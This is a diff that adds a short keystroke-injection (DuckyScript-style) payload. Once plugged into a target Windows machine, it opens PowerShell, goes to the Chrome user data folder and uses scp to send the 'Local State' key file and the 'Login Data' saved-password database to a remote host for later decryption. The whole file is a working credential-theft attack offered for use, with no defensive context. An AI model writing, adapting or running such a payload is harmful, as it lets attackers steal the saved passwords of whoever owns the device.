@@ -1,0 +1,21 @@
+REM Script to transfer Chrome encrypted password files from target device to decrypt
+
+DELAY 2000
+
+REM Open Powershell
+GUI r
+STRING powershell
+ENTER
+DELAY 500
+STRING cd "$env:LOCALAPPDATA\Google\Chrome\User Data"
+ENTER
+
+REM Send the encrypted files to remote machine over ssh using scp
+STRING scp "Local State" "Default\Login Data" USER@REMOTE_IP:/PATH/TO/REMOTE_MACHINE_DIR/
+ENTER
+DELAY 300
+STRING SCP_PASSWORD
+ENTER
+DELAY 300
+STRING exit
+ENTER
